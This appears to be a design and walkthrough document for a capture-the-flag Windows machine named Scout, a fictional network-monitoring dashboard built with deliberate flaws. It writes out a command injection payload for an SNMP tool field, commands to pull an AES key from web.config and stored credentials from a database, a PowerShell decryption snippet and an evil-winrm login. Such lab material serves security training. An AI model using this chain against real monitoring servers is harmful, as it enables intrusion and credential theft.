# CTF Machine: Scout

## Overview

**Name:** Scout
**Difficulty:** Medium
**OS:** Windows
**Domain:** `scout.ms`
**Theme:** NOC monitoring platform with SNMP diagnostic tool OS command injection and encrypted credential store recovery

**Story:** SignalEdge Network Operations monitors customer Windows hosts using a privileged collector account (`svc_collector`) that is a local Administrator on each node — including the NOC server itself. The dashboard stores node credentials AES-encrypted with a static key in `web.config`, replicating the real anti-pattern seen in SolarWinds/PRTG/ManageEngine deployments.

---

## Architecture

| Component | Detail |
|-----------|--------|
| Web | IIS + ASP.NET MVC dashboard (port 80/443) |
| Database | SQLite `inventory.db` (or MSSQL) — `MonitoredNodes` table |
| Credential Store | AES-256-CBC encrypted secrets, key in `web.config` |
| Open Ports | 80/443 (SignalEdge dashboard), 5985 (WinRM) |
| App runs as | `snmpsvc` (AppPool identity) |

---

## Attack Chain

### 1 → SNMP Tool Command Injection — Authenticated NOC Operator → snmpsvc

Authenticate as a NOC operator → Diagnostics → SNMP Walk tool. Backend concatenates `device_ip` into `cmd.exe` arguments unsanitized.

**Exploitation:**
```
device_ip = 127.0.0.1 & powershell -EncodedCommand BASE64PAYLOAD
```

Shell as `snmpsvc` → read `user.txt`.

🚩 **user.txt** → `C:\Users\snmpsvc\Desktop\user.txt`

---

### 2 → Credential Store Recovery — snmpsvc → svc_collector (Administrator)

As `snmpsvc`, read `web.config` for the AES key (`NodeCredentialKey`), then query the credential store in `inventory.db`.

**Exploitation:**
```powershell
# Read AES key from web.config
type C:\inetpub\SignalEdge\web.config | findstr /i "NodeCredentialKey"

# Query stored credentials
sqlite3 C:\SignalEdge\data\inventory.db "SELECT host,username,secret FROM MonitoredNodes;"
# localhost | svc_collector | b64:<iv><ciphertext>

# Decrypt
$key = [Convert]::FromBase64String($keyFromWebConfig)
$blob = [Convert]::FromBase64String($secretFromDb)
$iv = $blob[0..15]; $ct = $blob[16..($blob.Length-1)]
$a = [Security.Cryptography.Aes]::Create(); $a.Key=$key; $a.IV=$iv
[Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length))
```

`svc_collector` is local Administrator. Pivot via WinRM:
```bash
evil-winrm -i scout.ms -u svc_collector -p '<recovered password>'
```

🚩 **root.txt** → `C:\Users\Administrator\Desktop\root.txt`

---

## Flags

| Flag | Location | Access |
|------|----------|--------|
| user.txt | `C:\Users\snmpsvc\Desktop\user.txt` | snmpsvc |
| root.txt | `C:\Users\Administrator\Desktop\root.txt` | Administrator |

---

## Full Chain Diagram

```
NOC Operator
    │  SNMP Walk tool → command injection in device_ip
    │  Reverse shell as snmpsvc
    ▼
snmpsvc  →  user.txt
    │  web.config → AES key (NodeCredentialKey)
    │  inventory.db → encrypted svc_collector password
    │  AES-CBC decrypt → cleartext password
    │  evil-winrm as svc_collector (local Admin)
    ▼
Administrator  →  root.txt
```
